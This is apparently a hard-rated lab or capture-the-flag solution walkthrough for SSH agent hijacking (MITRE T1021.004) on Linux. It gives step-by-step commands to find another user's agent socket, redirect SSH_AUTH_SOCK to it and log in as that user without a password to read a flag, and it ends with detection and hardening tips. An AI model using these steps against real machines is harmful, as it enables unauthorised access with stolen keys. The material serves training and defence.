# T1021.004 – SSH Agent Hijacking | Solution Walkthrough
**Difficulty:** Hard | **OS:** Linux | **MITRE:** T1021.004

## Background
SSH agents store decrypted private keys in memory via a Unix socket.
If an attacker can access the socket file, they can use the keys without knowing the password.

## Step 1 – Start jump_admin's SSH Agent (Simulate)
```bash
# Start an SSH agent for jump_admin (as that user):
sudo -u jump_admin bash -c 'eval $(ssh-agent) && ssh-add ~/.ssh/id_ed25519 && echo "SSH_AUTH_SOCK=$SSH_AUTH_SOCK" > /tmp/agent_socket.txt && chmod 644 /tmp/agent_socket.txt && sleep 999' &
```

## Step 2 – Find the Agent Socket
```bash
# Find readable SSH agent sockets:
find /tmp -name "agent.*" 2>/dev/null
sudo find /proc -name "environ" -exec grep -l SSH_AUTH_SOCK {} \; 2>/dev/null | head -5
# OR check running SSH agent processes:
ps aux | grep ssh-agent
# Find socket path from process environment:
cat /tmp/agent_socket.txt 2>/dev/null
```

## Step 3 – Hijack the Agent
```bash
# Point SSH_AUTH_SOCK to jump_admin's socket:
export SSH_AUTH_SOCK=/tmp/ssh-XXXXX/agent.YYYYY  # path from step 2
# List keys in hijacked agent:
ssh-add -l
# Should show jump_admin's key!
```

## Step 4 – Use Hijacked Agent
```bash
ssh -o StrictHostKeyChecking=no jump_admin@localhost
# Authenticated as jump_admin using their key — no password!
cat ~/.flags/flag.txt  # inside jump_admin session
# OR:
ssh -o StrictHostKeyChecking=no jump_admin@localhost "cat /root/.flags/flag.txt"
```

## Detection
- Restrict SSH agent socket permissions: `chmod 700 /tmp/ssh-*/`
- Monitor `SSH_AUTH_SOCK` being accessed by unexpected users (auditd)
- Use `ForwardAgent no` in SSH config to prevent agent forwarding chains
